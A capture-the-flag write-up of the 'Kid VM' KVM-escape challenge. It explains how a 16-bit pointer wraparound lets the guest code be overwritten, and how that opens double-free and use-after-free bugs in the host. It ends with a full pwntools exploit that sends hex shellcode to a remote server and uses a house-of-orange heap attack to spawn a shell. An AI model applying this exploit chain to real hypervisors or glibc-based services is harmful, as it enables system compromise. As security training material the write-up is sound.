# Kid VM Writeup

## Recon

In this challenge, we were given a binary and a libc. Running the binary, we see:

```
Open /dev/kvm failed!
: No such file or directory
```

What is KVM? KVM is a kernel-based virtual machine. Installing kvm on linux and running the binary again, we then see:

```
Welcome to the Virtual World Memory Management!
What do you want to do?
1.Alloc memory
2.Update memory
3.Free memory
4.Alloc host memory
5.Update host memory
6.Free host memory
7.Exit
Your choice:
```

## Static Analysis

Now lets dive into the binary. Disassembling the main, we can see that it sets up a KVM by opening a file descriptor to /dev/kvm. It then mmaps a segment, and then copies the data at offset 0x18e0 in the binary to that section. Afterwards, it runs inside a loop that performs different actiosn based on the data inside the VCPU memory section, presumably registers or shared data between the host and the kernel vm.

These actions include: printing a character from the VCPU, reading a character to the VCPU, alloc host memory, update host memory, free host memory, and exitting.

Looking at the big picture, it seems that the host is communication with the guest (kvm) through the VCPU memory page, and the kvm is sending "instructions" to tell the host program what to do. The three functions (alloc, update, and free) seems to be implemented both on the host side and the kernel side. Naturally, if we want to gain RCE, we will have to exploit the host. However, these kernel functions must exist for a reason, suggesting that there must be a vulnerability in the kernel functions that allows us to then exploit the host.

For the host side functions, here is what they do:

Alloc memory:

![](allochost.png)

Takes a 2 byte size n where 0x80 <= n <= 0x1000. Mallocs this chunk and updates global variables. This also makes sure that we can't have more than 16 chunks. Pretty normal and boring.

Update host memory:

![](updatehost.png)

This function takes a 2 byte size n, 1 byte index s, and a buffer pointer containing our n bytes. This function is more interesting. There are two branches based on a register passed from the VCPU. One copies the contents of the buffer into the malloced chunk, the other branch does the opposite. By default, it is always the former as one might expect.

Free host memory:

![](freehost.png)

This function takes a 1 byte index, the chunk we want to free. This function has 3 branches based on a value from the VCPU. The default branch does what you might expect, frees the chunk, zeroes out the pointer and other information, and decrements the chunk count. However, there's one branch of exceptional interest, which only frees the chunk without touching its pointer. This means if we can get access to this branch, then we can trigger UAF and double free vulnerabilities!

Now to see how to access the other branches, we need to perform static analysis on the kernel code. Putting this code into IDA, renaming stuff, and playing around with it, we discover that it is 16 bit code.

Looking at the free host implementation in the kernel we see:

![](freehostkernel.png)

We can see that 3 being moved into the register bx, that must be the branch indicator, and we want to somehow change this to a 1. This is a hardcoded value, which means we must change the code in the mmapped section I mentioned above directly in order to change this.

What does this suggest? It means that we should either be able to overwrite an ASLR-randomized memory page using either the host or kernel. It makes more sense for the bug to be in the kernel, since this is a KVM escape challenge. Turns out this hypothesis is correct. The critical bug is in the kernel implementation of alloc_guest:

![](allocguest.png) 

Remember, this is a 16 bit architecture. A pointer is created with memorysum + 0x5000, where the max of memorysum is 0xb000. 0xb000 + 0x5000 = 0x10000... and in 16 bit that's 0! This means we can create a pointer to 0x0, which is the program's code itself, and we can overwrite the code with anything we want. 

## Exploit Development

With this the plan of attack for now is this:

1. Alloc guest 0xb * 0x1000 times to reach the memorysum limit
2. Obtain a pointer to 0x0
3. Overwrite the kernel code to enable the double free, free_host branch

I decided to overwrite the kernel code with a staging payload first, then read the rest in. Assembly code is attached.

Now that we have doublefree and UAF capabilities, how are we going to leak an address? We have no read primitives whatsoever. The solution? Create one ourselves in the kernel code! Remember the second branch of update host memory? This reads the data inside a chunk to a buffer shared between the host and the kernel, which we can then print out in the kernel! Code is attached as well.

So we have chunk a double free, UAF, and read chunk primitives. With this, we can exploit the rest on the host.

Because we can allocate smallbins, we can obtain a libc pointer by freeing the smallbin, which gets populated by arena pointers, then read from this chunk. Next we can leak heap by freeing two smallbins, and reading from their linked list pointers.

Using the UAF vulnerability, we can create overlapping chunks. I decided to overlap one chunk of size 0x80 inside one of size 400. Then to control the execution flow, I implemented house of orange on the overlapping chunks.

## Flag

rwctf{WoW_YoU_w1ll_B5_A_FFFutuRe_staR_In_vm_E5c4pe}

## Final Exploit

```python
from pwn import *

def alloc(size):
  r.recvuntil("choice:")
  r.send("1")
  r.recvuntil("ze:")
  r.send(p16(size))

def update(index, content):
  r.recvuntil("choice:")
  r.send("2")
  r.recvuntil("ex:")
  r.send(p8(index))
  r.recvuntil("tent:")
  r.send(content)

def allocHost(size):
  r.recvuntil("choice:")
  r.send("4")
  r.recvuntil("ze:")
  r.send(p16(size))

def updateHost(index, size, content):
  r.recvuntil("choice:")
  r.send("5")
  r.recvuntil("ze:")
  r.send(p16(size))
  r.recvuntil("ex:")
  r.send(p8(index))
  r.recvuntil("tent:")
  r.send(content)

def freeHost(index):
  r.recvuntil("choice:")
  r.send("6")
  r.recvuntil("dex:")
  r.send(p8(index))

def exit(index):
  r.recvuntil("choice:")
  r.send("7")

def copy(index, size):
  r.recvuntil("choice:")
  r.send("8")
  r.recvuntil("ze:")
  r.send(p16(size))
  r.recvuntil("ex:")
  r.send(p8(index))

def leak(size):
  r.recvuntil("choice:")
  r.send("9")
  r.recvuntil("ze:")
  r.send(p16(size))
  return r.recvn(size)

#r = process("./bin")
r = remote("34.236.229.208", 9999)

staging_second = "90909090909090909090909090909090b85200bb0700e82700b86900bb0003e80c00b85200bb0700e81500e93b0051525689d989c6e417880446e2f95e5a59c351525689d989c68a04e61746e2f95e5a59c36c6f616465640a".decode("hex")
replaced_code = "b80302bb0d00e86701b83e23bb0100e87001be3e238b043c3474203c3574123c36741d3c3774233c38740b3c397416ebcfe8e300ebcae89800ebc5e80d00ebc0e83500ebbbe86000ebb6f4505351525657b81002bb0500e81601b84023bb0200e81f016800019d8b1e4023b800010f01c15f5e5a595b58c3505351525657b8fd01bb0600e8e900b84323bb0100e8f2006800019db80101bb01008b0e43230f01c15f5e5a595b58c3505351525657b81002bb0500e8b900b84023bb0200e8c200b800408b1e4023e8a6005f5e5a595b58c3505351525657b81002bb0500e89000b84023bb0200e89900b8fd01bb0600e87e00b84323bb0100e887006800019db80201bb02008b0e43238b1640230f01c15f5e5a595b58c3505351525657b81002bb0500e84a00b84023bb0200e85300b8fd01bb0600e83800b84323bb0100e84100b81502bb0800e82600b800408b1e4023e82e006800019db80201bb01008b0e43238b1640230f01c15f5e5a595b58c351525689d989c68a04e61746e2f95e5a59c351525689d989c6e417880446e2f95e5a59c3496e6465783a596f75722063686f6963653a0a53697a653a436f6e74656e743a".decode("hex")

for i in range(0xb):
  alloc(0x1000)

alloc(len(staging_second))
update(0xb, staging_second)
r.recvuntil("loaded")
r.send(replaced_code.ljust(0x300, "\x90"))

for i in range(4):
  allocHost(400)

freeHost(1)
copy(1, 8)
libcbase = struct.unpack("Q", leak(8).ljust(8, "\x00"))[0] - 0x3c4b78

allocHost(400)
freeHost(2)
freeHost(0)
copy(0, 8)
heapbase = struct.unpack("Q", leak(8).ljust(8, "\x00"))[0] - 0x340

allocHost(0x80)
allocHost(0x80) #target chunk to fuck up in unsorted bins
freeHost(6)
iolistall = libcbase + 0x3c5520
system = libcbase + 0x45390
payload = "L"*128 + "/bin/sh\x00" + p64(0x61) + p64(0x0) + p64(iolistall-0x10) + p64(0x0) + p64(0x3)
payload += "Z"*144 + p64(0x0)*3 + p64(heapbase + 0x4b8)
payload += p64(system) * ((400 - len(payload)) / 8)
updateHost(2, 400, payload)
allocHost(0x80)

r.interactive()
```
